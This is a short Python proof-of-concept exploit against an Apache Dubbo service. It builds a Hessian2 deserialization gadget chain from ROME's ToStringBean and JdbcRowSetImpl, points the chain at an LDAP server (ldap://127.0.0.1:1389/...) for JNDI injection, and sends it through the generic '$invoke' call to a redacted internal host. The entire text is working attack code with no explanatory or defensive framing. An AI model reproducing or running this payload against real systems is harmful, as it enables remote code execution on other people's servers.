from dubbo.codec.hessian2 import Decoder,new_object
from dubbo.client import DubboClient

# client = DubboClient('10.xx.xx.1xx00', 20880)
client = DubboClient('10.xx.xx.xx', 12345)

JdbcRowSetImpl=new_object(
    'com.sun.rowset.JdbcRowSetImpl',
    dataSource="ldap://127.0.0.1:1389/uaw1pn",
    strMatchColumns=["foo"]
    )
JdbcRowSetImplClass=new_object(
    'java.lang.Class',
    name="com.sun.rowset.JdbcRowSetImpl",
    )
toStringBean=new_object(
    'com.rometools.rome.feed.impl.ToStringBean',
    beanClass=JdbcRowSetImplClass,
    obj=JdbcRowSetImpl
    )

resp = client.send_request_and_return_response(
    service_name='cn.rui0',
    # service_name='org.apache.dubbo.spring.boot.demo.consumer.DemoService',
    service_version='',
    method_name='$invoke',
    args=[toStringBean])

print(resp)